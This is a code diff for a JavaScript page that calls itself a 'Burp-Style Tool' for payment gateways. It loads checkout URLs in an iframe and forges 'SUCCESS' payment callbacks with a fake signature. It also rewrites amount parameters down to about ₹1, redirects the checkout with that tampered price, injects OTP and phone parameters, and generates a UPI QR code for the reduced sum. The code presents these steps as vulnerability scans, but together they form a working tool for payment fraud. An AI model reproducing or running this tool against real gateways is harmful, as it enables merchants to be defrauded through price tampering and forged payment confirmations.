+            // ─── HELPERS ───
+            function detectGateway(url) {
+                for (var i = 0; i < GATEWAYS.length; i++) {
+                    var g = GATEWAYS[i];
+                    for (var j = 0; j < g.patterns.length; j++) {
+                        if (g.patterns[j].test(url)) return g;
+                    }
+                }
+                return null;
+            }
+
+            function extractSessionId(url) {
+                var patterns = [
+                    /session_([A-Za-z0-9_\-]+)/,
+                    /order_id=([A-Za-z0-9_\-]+)/,
+                    /payment_id=([A-Za-z0-9_\-]+)/,
+                    /txn_id=([A-Za-z0-9_\-]+)/,
+                    /[?&]id=([A-Za-z0-9_\-]{10,})/
+                ];
+                for (var i = 0; i < patterns.length; i++) {
+                    var m = url.match(patterns[i]);
+                    if (m) return m[0];
+                }
+                var f = url.match(/\/(gateway|pay|payment|checkout)\/([A-Za-z0-9_\-]{10,})/);
+                if (f) return f[2];
+                return null;
+            }
+
+            function extractAmount(url, gateway) {
+                var params = gateway ? gateway.amountParams : ['amount', 'price', 'total', 'amt', 'value', 'txnAmount'];
+                for (var i = 0; i < params.length; i++) {
+                    var r = new RegExp('[?&]' + params[i] + '=([0-9.]+)', 'i');
+                    var m = url.match(r);
+                    if (m) return parseFloat(m[1]);
+                }
+                var cm = url.match(/[₹$]\s*([0-9.]+)/);
+                if (cm) return parseFloat(cm[1]);
+                return null;
+            }
+
+            function extractParams(url) {
+                var params = {};
+                try {
+                    var u = new URL(url);
+                    u.searchParams.forEach(function(v, k) { params[k] = v; });
+                } catch (e) {}
+                return params;
+            }
+
+            function buildUrl(url, params) {
+                try {
+                    var u = new URL(url);
+                    for (var k in params) {
+                        if (params[k] !== null && params[k] !== undefined && params[k] !== '') {
+                            u.searchParams.set(k, params[k]);
+                        } else {
+                            u.searchParams.delete(k);
+                        }
+                    }
+                    return u.toString();
+                } catch (e) { return url; }
+            }
+
+            function renderParamsDisplay(params) {
+                var html = '';
+                for (var k in params) {
+                    html += '<span class="param">' + sanitize(k) + '</span>: <span class="value">' + sanitize(params[
+                        k]) + '</span>\n';
+                }
+                return html || '<span style="color:#5a4f42;">No parameters</span>';
+            }
+
+            function sanitize(str) {
+                if (!str) return '';
+                var d = document.createElement('div');
+                d.textContent = str;
+                return d.innerHTML;
+            }
+
+            function getCurrentUrl() {
+                try {
+                    return gatewayFrame.contentWindow.location.href;
+                } catch (e) {
+                    return state.url || urlInput.value;
+                }
+            }
+
+            // ─── UPDATE UI ───
+            function updateUI() {
+                var url = getCurrentUrl();
+                currentUrlDisplay.textContent = url || 'https://...';
+
+                var gw = detectGateway(url);
+                state.detectedGateway = gw;
+                if (gw) {
+                    gatewayBadge.textContent = '⬡ ' + gw.name;
+                    gatewayBadge.className = 'badge detected';
+                    detectedGatewayName.textContent = gw.name;
+                    state.currency = gw.currency || 'INR';
+                    state.tamperedAmount = gw.testAmount || 1.00;
+                } else {
+                    gatewayBadge.textContent = '⏳ unknown';
+                    gatewayBadge.className = 'badge';
+                    detectedGatewayName.textContent = '—';
+                }
+
+                var session = extractSessionId(url);
+                state.sessionId = session;
+                detectedSession.textContent = session || '—';
+
+                var amount = extractAmount(url, gw);
+                state.originalAmount = amount;
+                detectedAmount.textContent = amount !== null ? (state.currency === 'INR' ? '₹' : '$') + ' ' + amount
+                    .toFixed(2) : '—';
+
+                var params = extractParams(url);
+                paramsViewer.innerHTML = renderParamsDisplay(params);
+
+                // Merge injected params
+                var allParams = Object.assign({}, params, state.injectedParams);
+                var injectedDisplay = '';
+                for (var k in state.injectedParams) {
+                    injectedDisplay += '<span class="param">' + sanitize(k) + '</span>: <span class="value">' + sanitize(
+                        state.injectedParams[k]) + '</span>  ';
+                }
+                injectedViewer.innerHTML = injectedDisplay || '<span style="color:#5a4f42;">No injections</span>';
+
+                // Update URL with injections
+                var newUrl = buildUrl(url, state.injectedParams);
+                if (newUrl !== url && newUrl !== state.url) {
+                    // Only update if different
+                }
+
+                // Hide overlay if iframe loaded
+                frameOverlay.style.display = url && url !== 'about:blank' ? 'none' : 'flex';
+            }
+
+            // ─── LOAD URL ───
+            function loadUrl(url) {
+                if (!url) {
+                    showToast('Enter a URL', 'error');
+                    return;
+                }
+                if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                    url = 'https://' + url;
+                }
+                state.url = url;
+                urlInput.value = url;
+                gatewayFrame.src = url;
+                setStatus('loading...', '');
+                showToast('Loading: ' + url, 'info');
+                // Update UI after load
+                setTimeout(updateUI, 1000);
+                setTimeout(updateUI, 3000);
+            }
+
+            // ─── INJECT FUNCTIONS ───
+            function injectParam(key, value) {
+                if (!key || !value) {
+                    showToast('Enter key and value', 'error');
+                    return;
+                }
+                state.injectedParams[key] = value;
+                updateUI();
+                // Reload frame with injected params
+                var current = getCurrentUrl();
+                var newUrl = buildUrl(current, state.injectedParams);
+                if (newUrl !== current) {
+                    gatewayFrame.src = newUrl;
+                    showToast('Injected: ' + key + '=' + value, 'success');
+                }
+                setStatus('injected', 'success');
+            }
+
+            // ─── BUG SCANNERS ───
+            function scanC2S() {
+                var url = getCurrentUrl();
+                if (!url || url === 'about:blank') {
+                    showToast('Load a gateway URL first', 'error');
+                    return;
+                }
+                var gw = detectGateway(url);
+                var session = extractSessionId(url);
+                if (!session) {
+                    bugOutput.innerHTML = '<span class="fail">✗ No session ID found — C2S not applicable</span>';
+                    showToast('No session ID', 'error');
+                    return;
+                }
+
+                var amount = extractAmount(url, gw) || 499;
+                var forged = buildUrl(url.split('?')[0] || url, {
+                    order_status: 'SUCCESS',
+                    txn_id: 'ARCHIVE_' + Date.now().toString(36),
+                    amount: amount.toFixed(2),
+                    signature: 'forged_by_archive',
+                    session_id: session,
+                    c2s_test: 'true'
+                });
+
+                bugOutput.innerHTML =
+                    '<span class="info">⤷ C2S test — forged callback:</span>\n' +
+                    '<span style="font-size:0.55rem;color:#6a5f52;word-break:break-all;">' + sanitize(forged) +
+                    '</span>\n\n' +
+                    '<span style="color:#5a4f42;">⬡ Did the server accept the forged callback?</span>\n' +
+                    '<button class="btn-sm success" onclick="window.c2sResult(true)">✓ Yes — vulnerable</button> ' +
+                    '<button class="btn-sm danger" onclick="window.c2sResult(false)">✗ No — not vulnerable</button>';
+
+                state.c2sTested = true;
+                showToast('C2S test ready — check server response', 'info');
+            }
+
+            window.c2sResult = function(success) {
+                state.c2sSuccess = success;
+                if (success) {
+                    bugOutput.innerHTML = '<span class="success">✓ C2S VULNERABLE</span> — Server accepted forged callback!';
+                    showToast('C2S vulnerability confirmed!', 'success');
+                } else {
+                    bugOutput.innerHTML = '<span class="fail">✗ C2S NOT VULNERABLE</span> — Server rejected forged callback.';
+                    showToast('C2S not vulnerable', 'info');
+                }
+            };
+
+            function scanPriceTamper() {
+                var url = getCurrentUrl();
+                if (!url || url === 'about:blank') {
+                    showToast('Load a gateway URL first', 'error');
+                    return;
+                }
+                var gw = detectGateway(url);
+                var amount = extractAmount(url, gw);
+                if (amount === null) {
+                    bugOutput.innerHTML = '<span class="warn">⚠ No amount parameter found</span>';
+                    return;
+                }
+
+                var tamperedAmount = gw ? gw.testAmount : 1.00;
+                var tamperedUrl = url;
+                var params = gw ? gw.amountParams : ['amount', 'price', 'total', 'amt'];
+
+                var replaced = false;
+                for (var i = 0; i < params.length; i++) {
+                    var r = new RegExp(params[i] + '=\\d+\\.?\\d*', 'gi');
+                    if (r.test(tamperedUrl)) {
+                        tamperedUrl = tamperedUrl.replace(r, params[i] + '=' + tamperedAmount.toFixed(2));
+                        replaced = true;
+                        break;
+                    }
+                }
+                if (!replaced) {
+                    var sep = tamperedUrl.includes('?') ? '&' : '?';
+                    tamperedUrl += sep + 'amount=' + tamperedAmount.toFixed(2);
+                }
+
+                bugOutput.innerHTML =
+                    '<span class="info">⤷ Price tamper test — original: ' + (state.currency === 'INR' ? '₹' : '$') +
+                    ' ' + amount.toFixed(2) + ' → tampered: ' + (state.currency === 'INR' ? '₹' : '$') + ' ' +
+                    tamperedAmount.toFixed(2) + '</span>\n' +
+                    '<span style="font-size:0.55rem;color:#6a5f52;word-break:break-all;">' + sanitize(tamperedUrl) +
+                    '</span>\n\n' +
+                    '<span style="color:#5a4f42;">⬡ Load this URL in the browser and check if price changed</span>\n' +
+                    '<button class="btn-sm success" onclick="window.loadTamperedUrl(\'' + sanitize(tamperedUrl) +
+                    '\')">⤷ Load tampered URL</button>';
+
+                state.tamperedUrl = tamperedUrl;
+                state.isTampered = true;
+                state.tamperedAmount = tamperedAmount;
+                showToast('Tampered URL ready — check in browser', 'warning');
+            }
+
+            window.loadTamperedUrl = function(url) {
+                gatewayFrame.src = url;
+                showToast('Loading tampered URL', 'info');
+                setTimeout(updateUI, 1500);
+            };
+
+            function scanAll() {
+                bugOutput.innerHTML = '<span class="info">⤷ Running full scan...</span>\n';
+                scanC2S();
+                setTimeout(function() {
+                    scanPriceTamper();
+                }, 500);
+            }
+
+            // ─── REDIRECT WITH TAMPER ───
+            function redirectWithTamper() {
+                var url = getCurrentUrl();
+                if (!url || url === 'about:blank') {
+                    showToast('Load a gateway URL first', 'error');
+                    return;
+                }
+                var gw = detectGateway(url);
+                var method = paymentMethodSelect.value;
+                var tamperedAmount = state.tamperedAmount || (gw ? gw.testAmount : 1.00);
+
+                var tamperedUrl = url;
+                var params = gw ? gw.amountParams : ['amount', 'price', 'total', 'amt'];
+                var replaced = false;
+                for (var i = 0; i < params.length; i++) {
+                    var r = new RegExp(params[i] + '=\\d+\\.?\\d*', 'gi');
+                    if (r.test(tamperedUrl)) {
+                        tamperedUrl = tamperedUrl.replace(r, params[i] + '=' + tamperedAmount.toFixed(2));
+                        replaced = true;
+                        break;
+                    }
+                }
+                if (!replaced) {
+                    var sep = tamperedUrl.includes('?') ? '&' : '?';
+                    tamperedUrl += sep + 'amount=' + tamperedAmount.toFixed(2);
+                }
+                tamperedUrl += '&payment_method=' + method;
+
+                // Merge injected params
+                tamperedUrl = buildUrl(tamperedUrl, state.injectedParams);
+
+                gatewayFrame.src = tamperedUrl;
+                state.tamperedUrl = tamperedUrl;
+                state.isTampered = true;
+                showToast('Redirected with ₹1/' + method, 'success');
+                setTimeout(updateUI, 1000);
+            }
+
+            // ─── SHOW QR ───
+            function showQrPopup() {
+                var gw = state.detectedGateway;
+                var amount = state.isTampered ? state.tamperedAmount : (state.originalAmount || 1.00);
+                var upiId = gw ? gw.upiMerchant : 'merchant@upi';
+                var sym = state.currency === 'INR' ? '₹' : '$';
+
+                qrPopupUpiId.textContent = 'UPI: ' + upiId;
+                qrPopupAmount.textContent = sym + ' ' + amount.toFixed(2);
+
+                qrPopupContainer.innerHTML = '';
+                try {
+                    var upiStr = 'upi://pay?pa=' + upiId + '&pn=Merchant&am=' + amount.toFixed(2) + '&cu=' + state
+                        .currency + '&tn=Archive';
+                    new QRCode(qrPopupContainer, {
+                        text: upiStr,
+                        width: 160,
+                        height: 160,
+                        colorDark: '#000000',
+                        colorLight: '#ffffff',
+                        correctLevel: QRCode.CorrectLevel.H
+                    });
+                } catch (e) {
+                    qrPopupContainer.innerHTML = '<span style="color:#6a3a3a;">QR error</span>';
+                }
+                qrPopup.classList.add('show');
+            }
+
+            // ─── EVENTS ───
+            loadBtn.addEventListener('click', function() { loadUrl(urlInput.value); });
+            reloadBtn.addEventListener('click', function() { loadUrl(getCurrentUrl() || urlInput.value); });
+            refreshFrameBtn.addEventListener('click', function() { gatewayFrame.src = gatewayFrame.src; });
+
+            goBackBtn.addEventListener('click', function() {
+                try { gatewayFrame.contentWindow.history.back(); } catch (e) { showToast('Cannot go back', 'error'); }
+            });
+            goForwardBtn.addEventListener('click', function() {
+                try { gatewayFrame.contentWindow.history.forward(); } catch (e) { showToast('Cannot go forward',
+                        'error'); }
+            });
+
+            urlInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') loadUrl(this.value); });
+
+            injectOtpBtn.addEventListener('click', function() {
+                var val = manualOtp.value.trim();
+                if (val) injectParam('otp', val);
+            });
+            injectPhoneBtn.addEventListener('click', function() {
+                var val = manualPhone.value.trim();
+                if (val) injectParam('phone', val);
+            });
+            injectCustomBtn.addEventListener('click', function() {
+                var k = manualKey.value.trim();
+                var v = manualValue.value.trim();
+                if (k && v) injectParam(k, v);
+            });
+
+            redirectWithTamperBtn.addEventListener('click', redirectWithTamper);
+            showQrBtn.addEventListener('click', showQrPopup);
+            qrPopupClose.addEventListener('click', function() { qrPopup.classList.remove('show'); });
+            qrPopup.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('show'); });
+
+            scanC2SBtn.addEventListener('click', scanC2S);
+            scanTamperBtn.addEventListener('click', scanPriceTamper);
+            scanAllBtn.addEventListener('click', scanAll);
+
+            // ─── IFRAME LOAD EVENTS ───
+            gatewayFrame.addEventListener('load', function() {
+                setTimeout(updateUI, 500);
+                setStatus('loaded', 'success');
+                // Try to capture URL
+                try {
+                    var url = gatewayFrame.contentWindow.location.href;
+                    if (url && url !== 'about:blank') {
+                        state.url = url;
+                        currentUrlDisplay.textContent = url;
+                    }
+                } catch (e) { /* cross-origin */ }
+                frameOverlay.style.display = 'none';
+            });
+
+            // ─── BOOT ───
+            if (urlInput.value.trim()) {
+                setTimeout(function() { loadUrl(urlInput.value); }, 300);
+            } else {
+                gatewayBadge.textContent = '⏳ awaiting link';
+                gatewayBadge.className = 'badge';
+                setStatus('ready', '');
+                frameOverlay.style.display = 'flex';
+            }
+
+            // Periodic UI update
+            setInterval(function() {
+                if (gatewayFrame.src && gatewayFrame.src !== 'about:blank') {
+                    try {
+                        var u = gatewayFrame.contentWindow.location.href;
+                        if (u && u !== state.url) {
+                            state.url = u;
+                            updateUI();
+                        }
+                    } catch (e) { /* cross-origin — use current URL */ }
+                }
+            }, 3000);
+
+            console.log('⌬ Burp-Style Tool loaded · Real-time browser + bug detection');
+            console.log('📌 Use Manual tab to inject OTP, phone, custom params');
+            console.log('📌 Bugs tab scans C2S and price tampering');
+        })();
+    </script>
+
+</body>
+</html>
